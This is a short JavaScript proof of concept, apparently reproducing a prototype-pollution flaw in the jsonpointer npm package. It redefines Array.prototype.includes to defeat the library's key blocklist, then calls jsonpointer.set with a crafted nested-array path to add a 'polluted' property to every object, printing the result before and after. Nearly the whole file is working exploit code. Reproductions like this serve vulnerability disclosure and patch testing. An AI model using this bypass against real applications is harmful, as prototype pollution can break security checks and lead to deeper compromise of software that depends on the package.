Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const jsonpointer = require('jsonpointer');
console.log({}.polluted);
jsonpointer.set({}, [
    ['proto'],
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);